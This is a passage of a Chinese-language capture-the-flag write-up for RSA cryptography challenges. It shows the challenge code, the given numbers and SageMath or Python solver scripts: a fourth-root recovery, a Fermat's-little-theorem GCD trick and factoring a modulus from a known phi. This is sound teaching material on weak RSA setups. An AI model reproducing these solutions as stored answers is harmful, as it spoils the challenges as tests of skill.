class="number">305364532854935080710443995362714630091</span></span><br><span class="line">c= <span class="number">14745090428909283741632702934793176175157287000845660394920203837824364163635</span></span><br><span class="line">n= <span class="number">55807222544207698804941555841826949089076269327839468775219849408812970713531</span></span><br><span class="line">e = <span class="number">4</span></span><br><span class="line">ps = [p, q]</span><br><span class="line">checker = genHeaderChecker(<span class="string">&#x27;NSSCTF&#x27;</span>)</span><br><span class="line">res = nthRSA_n(c, e, ps, checker=checker)</span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> res:</span><br><span class="line">  flag = long_to_bytes(<span class="built_in">int</span>(r))</span><br><span class="line">  <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>这里也贴一个别的师傅的<a href="https://seandictionary.top/ghctf-2025/">脚本</a>(可以不用上面较为复杂的<code>AMM</code>，所以代码比较简洁)，利用<code>nth_root</code>进行开方根并<code>crt</code>求解</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p= <span class="number">182756071972245688517047475576147877841</span></span><br><span class="line">q= <span class="number">305364532854935080710443995362714630091</span></span><br><span class="line">c= <span class="number">14745090428909283741632702934793176175157287000845660394920203837824364163635</span></span><br><span class="line">n= <span class="number">55807222544207698804941555841826949089076269327839468775219849408812970713531</span></span><br><span class="line">e= <span class="number">4</span></span><br><span class="line"> </span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">gcd = GCD(e,phi)</span><br><span class="line"> </span><br><span class="line">res1 = Zmod(p)(c).nth_root(gcd, <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">res2 = Zmod(q)(c).nth_root(gcd, <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> res2:</span><br><span class="line">        m = crt([<span class="built_in">int</span>(i),<span class="built_in">int</span>(j)],[p,q])</span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)).decode())</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h2 id="EZ-Fermat"><a href="#EZ-Fermat" class="headerlink" title="EZ_Fermat"></a>EZ_Fermat</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> f</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;NSSCTF&#123;test_flag&#125;&#x27;</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = ZZ[]</span><br><span class="line">f = R(<span class="built_in">str</span>(f))</span><br><span class="line"></span><br><span class="line">w = <span class="built_in">pow</span>(<span class="number">2</span>,f(p),n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n = &#125;</span>\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;e = &#125;</span>\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c = &#125;</span>\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;f = &#125;</span>\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;w = &#125;</span>\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 101780569941880865465631942473186578520071435753163950944409148606282910806650879176280021512435190682009749926285674412651435782567149633130455645157688819845748439487113261739503325065997835517112163014056297017874761742768297646567397770742374004940360061700285170103292360590891188591132054903101398360047</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">c = 77538275949900942020886849496162539665323546686749270705418870515132296087721218282974435210763225488530925782158331269160555819622551413648073293857866671421886753377970220838141826468831099375757481041897142546760492813343115244448184595644585857978116766199800311200819967057790401213156560742779242511746</span></span><br><span class="line"><span class="string">f = 2*x^332 - x^331 + x^329 + 3*x^328 - x^327 - 3*x^325 + x^323 - 3*x^322 - x^321 - 3*x^320 + x^319 + 2*x^318 - 4*x^317 - 3*x^315 - 2*x^314 + x^313 + x^312 + 2*x^311 + 2*x^309 + 2*x^308 + 5*x^307 + 2*x^306 + 3*x^305 + 5*x^304 + 4*x^303 + x^302 - x^301 - x^300 - 2*x^299 - 2*x^298 + x^297 + 3*x^296 - x^295 - 4*x^292 - x^290 + 4*x^289 - x^287 - 3*x^286 + x^285 - 2*x^284 + x^283 - x^282 - 2*x^281 + x^280 - 2*x^279 + x^278 + 2*x^277 - 3*x^276 - x^275 - 4*x^274 - 3*x^273 - 5*x^272 - 2*x^271 - 3*x^270 + 2*x^269 + 2*x^268 - x^267 - 2*x^266 + x^265 + x^264 - 3*x^262 - 3*x^259 + 2*x^258 - x^257 + 2*x^256 + 2*x^255 - x^254 - 2*x^253 - x^252 + 2*x^251 - x^250 + x^249 + 2*x^247 + 2*x^246 + 2*x^245 - 2*x^244 - 3*x^243 + 2*x^242 - 3*x^241 - x^240 - 3*x^239 - x^236 - 3*x^235 - 2*x^234 - x^233 - 2*x^232 - x^231 - 3*x^230 - 2*x^229 - 4*x^228 - 2*x^227 - 3*x^226 + 2*x^225 + x^224 - x^223 - 2*x^221 + 3*x^219 - x^217 - 2*x^216 + x^215 + 2*x^213 - x^212 + 3*x^211 + x^210 + 4*x^209 + x^208 - x^206 - x^205 - x^204 + 2*x^203 - 3*x^202 + 2*x^199 - x^198 + 2*x^196 - 2*x^195 + 3*x^194 + 3*x^193 - x^192 + 4*x^191 + 2*x^189 + x^186 - x^185 - x^184 + 3*x^183 + x^182 + 2*x^181 - 2*x^180 + x^177 + x^175 - x^173 + 3*x^172 + x^170 + x^169 - x^167 - 2*x^166 - x^165 - 4*x^164 - 2*x^163 + 2*x^162 + 4*x^161 - 2*x^160 - 3*x^159 - 2*x^158 - 2*x^157 + x^156 - x^155 + 3*x^154 - 4*x^153 + x^151 + 2*x^150 + x^149 - x^148 + 2*x^147 + 3*x^146 + 2*x^145 - 4*x^144 - 4*x^143 + x^142 - 2*x^140 - 2*x^139 + 2*x^138 + 3*x^137 + 3*x^136 + 3*x^135 + x^134 - x^133 + 2*x^132 + 3*x^130 - 3*x^129 - 2*x^128 - x^127 - 2*x^126 + x^125 + x^124 - 2*x^123 + x^122 - x^121 + 3*x^120 - x^119 - 2*x^118 - x^117 - x^116 - 2*x^115 + 2*x^114 + 2*x^113 - 3*x^112 - x^111 - 4*x^110 + x^109 + x^108 + x^106 - 4*x^105 + x^104 - x^103 - x^101 + x^100 - 2*x^99 + x^98 - x^97 + 3*x^96 + 3*x^94 - x^93 - x^92 + x^91 - 2*x^90 + x^89 - x^88 + x^87 - x^86 + x^85 + x^84 - x^83 + x^79 - 3*x^78 - 2*x^77 + x^74 + 3*x^73 - x^72 - 3*x^71 - 2*x^70 + x^69 - 3*x^66 + x^65 + x^64 - 4*x^62 - x^61 + x^60 - x^59 + 3*x^58 - x^57 - x^54 + 3*x^53 + x^51 - 3*x^50 - x^49 + 2*x^47 - x^46 - x^44 + x^43 - x^42 - 4*x^41 - 3*x^39 - x^37 - x^36 - 3*x^35 + x^34 + x^33 - 2*x^32 + 2*x^31 - x^30 + 2*x^29 - 2*x^28 - 2*x^27 - x^24 + x^22 - 5*x^21 + 3*x^20 + 2*x^19 - x^18 + 2*x^17 + x^16 - 2*x^15 - 2*x^14 + x^13 + x^12 + 2*x^11 - 3*x^10 + 3*x^9 + 2*x^8 - 4*x^6 - 2*x^5 - 4*x^4 + x^3 - x^2 - 1</span></span><br><span class="line"><span class="string">w = 32824596080441735190523997982799829197530203904568086251690542244969244071312854874746142497647579310192994177896837383837384405062036521829088599595750902976191010000575697075792720479387771945760107268598283406893094243282498381006464103080551366587157561686900620059394693185990788592220509670478190685244</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>$根据费马小定理，2^{f(p)}(mod\ n)\equiv 2^{f(p)\ mod\ (p-1)}(mod\ p)，这步sage就可以直接解了$<br>$或者有，f(p)=f(1)=-57\ mod\ p-1$<br>$为什么二者相等呢？因为$<br>$f(x)=a_{n}<em>x^{n}+a_{n-1}</em>x^{n-1}+a_{n-2}<em>x^{n-2}+…+a_{0}</em>x^{0}$<br>$f(p)\ mod\ p-1=a_{n}+a_{n-1}+a_{n-2}+…+a_{0}=f(1)\ mod\ p-1$</p><p>还有位师傅的思路是<a href="https://seandictionary.top/ghctf-2025/">换元</a>，还有下面那题二元的<strong>换元消y</strong>，不是很能理解</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">101780569941880865465631942473186578520071435753163950944409148606282910806650879176280021512435190682009749926285674412651435782567149633130455645157688819845748439487113261739503325065997835517112163014056297017874761742768297646567397770742374004940360061700285170103292360590891188591132054903101398360047</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">77538275949900942020886849496162539665323546686749270705418870515132296087721218282974435210763225488530925782158331269160555819622551413648073293857866671421886753377970220838141826468831099375757481041897142546760492813343115244448184595644585857978116766199800311200819967057790401213156560742779242511746</span></span><br><span class="line">w = <span class="number">32824596080441735190523997982799829197530203904568086251690542244969244071312854874746142497647579310192994177896837383837384405062036521829088599595750902976191010000575697075792720479387771945760107268598283406893094243282498381006464103080551366587157561686900620059394693185990788592220509670478190685244</span></span><br><span class="line">R.&lt;x&gt; = ZZ[]</span><br><span class="line">f = <span class="number">2</span>*x^<span class="number">332</span> - x^<span class="number">331</span> + x^<span class="number">329</span> + <span class="number">3</span>*x^<span class="number">328</span> - x^<span class="number">327</span> - <span class="number">3</span>*x^<span class="number">325</span> + x^<span class="number">323</span> - <span class="number">3</span>*x^<span class="number">322</span> - x^<span class="number">321</span> - <span class="number">3</span>*x^<span class="number">320</span> + x^<span class="number">319</span> + <span class="number">2</span>*x^<span class="number">318</span> - <span class="number">4</span>*x^<span class="number">317</span> - <span class="number">3</span>*x^<span class="number">315</span> - <span class="number">2</span>*x^<span class="number">314</span> + x^<span class="number">313</span> + x^<span class="number">312</span> + <span class="number">2</span>*x^<span class="number">311</span> + <span class="number">2</span>*x^<span class="number">309</span> + <span class="number">2</span>*x^<span class="number">308</span> + <span class="number">5</span>*x^<span class="number">307</span> + <span class="number">2</span>*x^<span class="number">306</span> + <span class="number">3</span>*x^<span class="number">305</span> + <span class="number">5</span>*x^<span class="number">304</span> + <span class="number">4</span>*x^<span class="number">303</span> + x^<span class="number">302</span> - x^<span class="number">301</span> - x^<span class="number">300</span> - <span class="number">2</span>*x^<span class="number">299</span> - <span class="number">2</span>*x^<span class="number">298</span> + x^<span class="number">297</span> + <span class="number">3</span>*x^<span class="number">296</span> - x^<span class="number">295</span> - <span class="number">4</span>*x^<span class="number">292</span> - x^<span class="number">290</span> + <span class="number">4</span>*x^<span class="number">289</span> - x^<span class="number">287</span> - <span class="number">3</span>*x^<span class="number">286</span> + x^<span class="number">285</span> - <span class="number">2</span>*x^<span class="number">284</span> + x^<span class="number">283</span> - x^<span class="number">282</span> - <span class="number">2</span>*x^<span class="number">281</span> + x^<span class="number">280</span> - <span class="number">2</span>*x^<span class="number">279</span> + x^<span class="number">278</span> + <span class="number">2</span>*x^<span class="number">277</span> - <span class="number">3</span>*x^<span class="number">276</span> - x^<span class="number">275</span> - <span class="number">4</span>*x^<span class="number">274</span> - <span class="number">3</span>*x^<span class="number">273</span> - <span class="number">5</span>*x^<span class="number">272</span> - <span class="number">2</span>*x^<span class="number">271</span> - <span class="number">3</span>*x^<span class="number">270</span> + <span class="number">2</span>*x^<span class="number">269</span> + <span class="number">2</span>*x^<span class="number">268</span> - x^<span class="number">267</span> - <span class="number">2</span>*x^<span class="number">266</span> + x^<span class="number">265</span> + x^<span class="number">264</span> - <span class="number">3</span>*x^<span class="number">262</span> - <span class="number">3</span>*x^<span class="number">259</span> + <span class="number">2</span>*x^<span class="number">258</span> - x^<span class="number">257</span> + <span class="number">2</span>*x^<span class="number">256</span> + <span class="number">2</span>*x^<span class="number">255</span> - x^<span class="number">254</span> - <span class="number">2</span>*x^<span class="number">253</span> - x^<span class="number">252</span> + <span class="number">2</span>*x^<span class="number">251</span> - x^<span class="number">250</span> + x^<span class="number">249</span> + <span class="number">2</span>*x^<span class="number">247</span> + <span class="number">2</span>*x^<span class="number">246</span> + <span class="number">2</span>*x^<span class="number">245</span> - <span class="number">2</span>*x^<span class="number">244</span> - <span class="number">3</span>*x^<span class="number">243</span> + <span class="number">2</span>*x^<span class="number">242</span> - <span class="number">3</span>*x^<span class="number">241</span> - x^<span class="number">240</span> - <span class="number">3</span>*x^<span class="number">239</span> - x^<span class="number">236</span> - <span class="number">3</span>*x^<span class="number">235</span> - <span class="number">2</span>*x^<span class="number">234</span> - x^<span class="number">233</span> - <span class="number">2</span>*x^<span class="number">232</span> - x^<span class="number">231</span> - <span class="number">3</span>*x^<span class="number">230</span> - <span class="number">2</span>*x^<span class="number">229</span> - <span class="number">4</span>*x^<span class="number">228</span> - <span class="number">2</span>*x^<span class="number">227</span> - <span class="number">3</span>*x^<span class="number">226</span> + <span class="number">2</span>*x^<span class="number">225</span> + x^<span class="number">224</span> - x^<span class="number">223</span> - <span class="number">2</span>*x^<span class="number">221</span> + <span class="number">3</span>*x^<span class="number">219</span> - x^<span class="number">217</span> - <span class="number">2</span>*x^<span class="number">216</span> + x^<span class="number">215</span> + <span class="number">2</span>*x^<span class="number">213</span> - x^<span class="number">212</span> + <span class="number">3</span>*x^<span class="number">211</span> + x^<span class="number">210</span> + <span class="number">4</span>*x^<span class="number">209</span> + x^<span class="number">208</span> - x^<span class="number">206</span> - x^<span class="number">205</span> - x^<span class="number">204</span> + <span class="number">2</span>*x^<span class="number">203</span> - <span class="number">3</span>*x^<span class="number">202</span> + <span class="number">2</span>*x^<span class="number">199</span> - x^<span class="number">198</span> + <span class="number">2</span>*x^<span class="number">196</span> - <span class="number">2</span>*x^<span class="number">195</span> + <span class="number">3</span>*x^<span class="number">194</span> + <span class="number">3</span>*x^<span class="number">193</span> - x^<span class="number">192</span> + <span class="number">4</span>*x^<span class="number">191</span> + <span class="number">2</span>*x^<span class="number">189</span> + x^<span class="number">186</span> - x^<span class="number">185</span> - x^<span class="number">184</span> + <span class="number">3</span>*x^<span class="number">183</span> + x^<span class="number">182</span> + <span class="number">2</span>*x^<span class="number">181</span> - <span class="number">2</span>*x^<span class="number">180</span> + x^<span class="number">177</span> + x^<span class="number">175</span> - x^<span class="number">173</span> + <span class="number">3</span>*x^<span class="number">172</span> + x^<span class="number">170</span> + x^<span class="number">169</span> - x^<span class="number">167</span> - <span class="number">2</span>*x^<span class="number">166</span> - x^<span class="number">165</span> - <span class="number">4</span>*x^<span class="number">164</span> - <span class="number">2</span>*x^<span class="number">163</span> + <span class="number">2</span>*x^<span class="number">162</span> + <span class="number">4</span>*x^<span class="number">161</span> - <span class="number">2</span>*x^<span class="number">160</span> - <span class="number">3</span>*x^<span class="number">159</span> - <span class="number">2</span>*x^<span class="number">158</span> - <span class="number">2</span>*x^<span class="number">157</span> + x^<span class="number">156</span> - x^<span class="number">155</span> + <span class="number">3</span>*x^<span class="number">154</span> - <span class="number">4</span>*x^<span class="number">153</span> + x^<span class="number">151</span> + <span class="number">2</span>*x^<span class="number">150</span> + x^<span class="number">149</span> - x^<span class="number">148</span> + <span class="number">2</span>*x^<span class="number">147</span> + <span class="number">3</span>*x^<span class="number">146</span> + <span class="number">2</span>*x^<span class="number">145</span> - <span class="number">4</span>*x^<span class="number">144</span> - <span class="number">4</span>*x^<span class="number">143</span> + x^<span class="number">142</span> - <span class="number">2</span>*x^<span class="number">140</span> - <span class="number">2</span>*x^<span class="number">139</span> + <span class="number">2</span>*x^<span class="number">138</span> + <span class="number">3</span>*x^<span class="number">137</span> + <span class="number">3</span>*x^<span class="number">136</span> + <span class="number">3</span>*x^<span class="number">135</span> + x^<span class="number">134</span> - x^<span class="number">133</span> + <span class="number">2</span>*x^<span class="number">132</span> + <span class="number">3</span>*x^<span class="number">130</span> - <span class="number">3</span>*x^<span class="number">129</span> - <span class="number">2</span>*x^<span class="number">128</span> - x^<span class="number">127</span> - <span class="number">2</span>*x^<span class="number">126</span> + x^<span class="number">125</span> + x^<span class="number">124</span> - <span class="number">2</span>*x^<span class="number">123</span> + x^<span class="number">122</span> - x^<span class="number">121</span> + <span class="number">3</span>*x^<span class="number">120</span> - x^<span class="number">119</span> - <span class="number">2</span>*x^<span class="number">118</span> - x^<span class="number">117</span> - x^<span class="number">116</span> - <span class="number">2</span>*x^<span class="number">115</span> + <span class="number">2</span>*x^<span class="number">114</span> + <span class="number">2</span>*x^<span class="number">113</span> - <span class="number">3</span>*x^<span class="number">112</span> - x^<span class="number">111</span> - <span class="number">4</span>*x^<span class="number">110</span> + x^<span class="number">109</span> + x^<span class="number">108</span> + x^<span class="number">106</span> - <span class="number">4</span>*x^<span class="number">105</span> + x^<span class="number">104</span> - x^<span class="number">103</span> - x^<span class="number">101</span> + x^<span class="number">100</span> - <span class="number">2</span>*x^<span class="number">99</span> + x^<span class="number">98</span> - x^<span class="number">97</span> + <span class="number">3</span>*x^<span class="number">96</span> + <span class="number">3</span>*x^<span class="number">94</span> - x^<span class="number">93</span> - x^<span class="number">92</span> + x^<span class="number">91</span> - <span class="number">2</span>*x^<span class="number">90</span> + x^<span class="number">89</span> - x^<span class="number">88</span> + x^<span class="number">87</span> - x^<span class="number">86</span> + x^<span class="number">85</span> + x^<span class="number">84</span> - x^<span class="number">83</span> + x^<span class="number">79</span> - <span class="number">3</span>*x^<span class="number">78</span> - <span class="number">2</span>*x^<span class="number">77</span> + x^<span class="number">74</span> + <span class="number">3</span>*x^<span class="number">73</span> - x^<span class="number">72</span> - <span class="number">3</span>*x^<span class="number">71</span> - <span class="number">2</span>*x^<span class="number">70</span> + x^<span class="number">69</span> - <span class="number">3</span>*x^<span class="number">66</span> + x^<span class="number">65</span> + x^<span class="number">64</span> - <span class="number">4</span>*x^<span class="number">62</span> - x^<span class="number">61</span> + x^<span class="number">60</span> - x^<span class="number">59</span> + <span class="number">3</span>*x^<span class="number">58</span> - x^<span class="number">57</span> - x^<span class="number">54</span> + <span class="number">3</span>*x^<span class="number">53</span> + x^<span class="number">51</span> - <span class="number">3</span>*x^<span class="number">50</span> - x^<span class="number">49</span> + <span class="number">2</span>*x^<span class="number">47</span> - x^<span class="number">46</span> - x^<span class="number">44</span> + x^<span class="number">43</span> - x^<span class="number">42</span> - <span class="number">4</span>*x^<span class="number">41</span> - <span class="number">3</span>*x^<span class="number">39</span> - x^<span class="number">37</span> - x^<span class="number">36</span> - <span class="number">3</span>*x^<span class="number">35</span> + x^<span class="number">34</span> + x^<span class="number">33</span> - <span class="number">2</span>*x^<span class="number">32</span> + <span class="number">2</span>*x^<span class="number">31</span> - x^<span class="number">30</span> + <span class="number">2</span>*x^<span class="number">29</span> - <span class="number">2</span>*x^<span class="number">28</span> - <span class="number">2</span>*x^<span class="number">27</span> - x^<span class="number">24</span> + x^<span class="number">22</span> - <span class="number">5</span>*x^<span class="number">21</span> + <span class="number">3</span>*x^<span class="number">20</span> + <span class="number">2</span>*x^<span class="number">19</span> - x^<span class="number">18</span> + <span class="number">2</span>*x^<span class="number">17</span> + x^<span class="number">16</span> - <span class="number">2</span>*x^<span class="number">15</span> - <span class="number">2</span>*x^<span class="number">14</span> + x^<span class="number">13</span> + x^<span class="number">12</span> + <span class="number">2</span>*x^<span class="number">11</span> - <span class="number">3</span>*x^<span class="number">10</span> + <span class="number">3</span>*x^<span class="number">9</span> + <span class="number">2</span>*x^<span class="number">8</span> - <span class="number">4</span>*x^<span class="number">6</span> - <span class="number">2</span>*x^<span class="number">5</span> - <span class="number">4</span>*x^<span class="number">4</span> + x^<span class="number">3</span> - x^<span class="number">2</span> - <span class="number">1</span></span><br><span class="line">p = GCD(w-<span class="built_in">pow</span>(<span class="number">2</span>,<span class="built_in">int</span>(f%(x-<span class="number">1</span>),n),n))</span><br><span class="line"><span class="comment"># p = GCD(w * pow(2, -f(1), n) - 1, n)</span></span><br><span class="line">q = n // p</span><br><span class="line">d = inverse(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)).decode())</span><br></pre></td></tr></table></figure><p>$f\%(x-1)，这一看，sage还是太强大了$</p><h2 id="baby-factor-revenge"><a href="#baby-factor-revenge" class="headerlink" title="baby_factor_revenge"></a>baby_factor_revenge</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>():</span><br><span class="line">    pl  = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        pl.append(getPrime(<span class="number">1024</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sorted</span>(pl)</span><br><span class="line">pl = create()</span><br><span class="line">m=<span class="string">b&#x27;NSSCTF&#123;xxxxxx&#125;&#x27;</span></span><br><span class="line">p,q,r = pl[<span class="number">0</span>],pl[<span class="number">1</span>],pl[<span class="number">2</span>]</span><br><span class="line">n = p*q*r</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">phi_2=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">n2=p*q</span><br><span class="line">c=<span class="built_in">pow</span>(bytes_to_long(m),e,n2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n=<span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;phi=<span class="subst">&#123;phi&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c=<span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n=3191868707489083296976422171754481125088448532695639929013026951283334085716937496519972309690132954050242378974370025245594553866043111294840209514577676946872746793700126873931085112786381515154186105142460622301297252278473097650013016482539838576476763183025029834004241446095147665598581368214114851984460699747964946764645986828307675081596907634022110868102739948513844625534865764252668312850364286204872187001344218083941399088833989233474318289529103178632284291007694811574023047207470113594082533713524606268388742119103653587354956091145288566437795469230667897089543048576812362251576281067933183713438502813206542834734983616378764909202774603304124497453696792428111112644362307853143219890039129054302905340695668256116233515323529918746264727874817221051242387145263342018617858562987223211598238069486447049955021864781104312134816578626968386395835285074116149472750100154961405785440009296096563521430833</span></span><br><span class="line"><span class="string">phi=3191868707489083296976422171754481125088448532695639929013026951283334085716937496519972309690132954050242378974370025245594553866043111294840209514577676946872746793700126873931085112786381515154186105142460622301297252278473097650013016482539838576476763183025029834004241446095147665598581368214114851984394758254181484105857103844940487787404078873566779953101987404891507588290232992132681729619718279684673827347612899406697514777723904351697638562060304399923174376216080338949397741477013367831377040866937433520175862575061413321076151761545984886547872427147498175814451096795344136954743868643889768901204954902708679102384061694877757565486240670882343628571424084461972849147495569088820011108794930593172573959423278140327579049114196086428504291102619820322231225943837444001821535593671764186251713714593498207219093585758479440828038119079608764008747539277397742897542501803218788455452391287578171880267200</span></span><br><span class="line"><span class="string">c=8847973599594272436100870059187158819529199340583461915617467299706215012295598155778224026186157290320191983062022702191439286020733625396165573681688842631368993650799220713225485752608650482408353598320160571916055498330875851476520668973214124194890108144336715482373743731578734960096351460142579903010557821654345995923836938260379746304222820835040419844947019844885128550552066290798665884099701340641403329066058638137944934073185448687990744852400616823426082588916251127609191094346267837812018236673478691437630461425526779014305216914035039981685211625653600564431704400207095883904994772993227506462664</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>脚本源自<a href="https://github.com/jvdsn/crypto-attacks/blob/master/attacks/factorization/known_phi.py">https://github.com/jvdsn/crypto-attacks/blob/master/attacks/factorization/known_phi.py</a><br>(原来这个仓库早在<code>SHCTF2024-week4</code>就已经在题目中告诉我们了)</p><p>参考题目<code>NKCTF2023-ez_rsa</code>，<code>Google</code>搜<code>attack phi n</code>即可往下找到，作者的<code>github仓库</code>还有好多<code>attack脚本</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> isqrt</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> is_prime</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factorize</span>(<span class="params">N, phi</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Recovers the prime factors from a modulus if Euler&#x27;s totient is known.</span></span><br><span class="line"><span class="string">    This method only works for a modulus consisting of 2 primes!</span></span><br><span class="line"><span class="string">    :param N: the modulus</span></span><br><span class="line"><span class="string">    :param phi: Euler&#x27;s totient, the order of the multiplicative group modulo N</span></span><br><span class="line"><span class="string">    :return: a tuple containing the prime factors, or None if the factors were not found</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    s = N + <span class="number">1</span> - phi</span><br><span class="line">    d = s ** <span class="number">2</span> - <span class="number">4</span> * N</span><br><span class="line">    p = <span class="built_in">int</span>(s - isqrt(d)) // <span class="number">2</span></span><br><span class="line">    q = <span class="built_in">int</span>(s + isqrt(d)) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factorize_multi_prime</span>(<span class="params">N, phi</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Recovers the prime factors from a modulus if Euler&#x27;s totient is known.</span></span><br><span class="line"><span class="string">    This method works for a modulus consisting of any number of primes, but is considerably be slower than factorize.</span></span><br><span class="line"><span class="string">    More information: Hinek M. J., Low M. K., Teske E., &quot;On Some Attacks on Multi-prime RSA&quot; (Section 3)</span></span><br><span class="line"><span class="string">    :param N: the modulus</span></span><br><span class="line"><span class="string">    :param phi: Euler&#x27;s totient, the order of the multiplicative group modulo N</span></span><br><span class="line"><span class="string">    :return: a tuple containing the prime factors</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    prime_factors = <span class="built_in">set</span>()</span><br><span class="line">    factors = [N]</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(factors) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># Element to factorize.</span></span><br><span class="line">        N = factors[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        w = randrange(<span class="number">2</span>, N - <span class="number">1</span>)</span><br><span class="line">        i = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> phi % (<span class="number">2</span> ** i) == <span class="number">0</span>:</span><br><span class="line">            sqrt_1 = <span class="built_in">pow</span>(w, phi // (<span class="number">2</span> ** i), N)</span><br><span class="line">            <span class="keyword">if</span> sqrt_1 &gt; <span class="number">1</span> <span class="keyword">and</span> sqrt_1 != N - <span class="number">1</span>:</span><br><span class="line">                <span class="comment"># We can remove the element to factorize now, because we have a factorization.</span></span><br><span class="line">                factors = factors[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">                p = gcd(N, sqrt_1 + <span class="number">1</span>)</span><br><span class="line">                q = N // p</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> is_prime(p):</span><br><span class="line">                    prime_factors.add(p)</span><br><span class="line">                <span class="keyword">elif</span> p &gt; <span class="number">1</span>:</span><br><span class="line">                    factors.append(p)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> is_prime(q):</span><br><span class="line">                    prime_factors.add(q)</span><br><span class="line">                <span class="keyword">elif</span> q &gt; <span class="number">1</span>:</span><br><span class="line">                    factors.append(q)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># Continue in the outer loop</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(prime_factors)</span><br><span 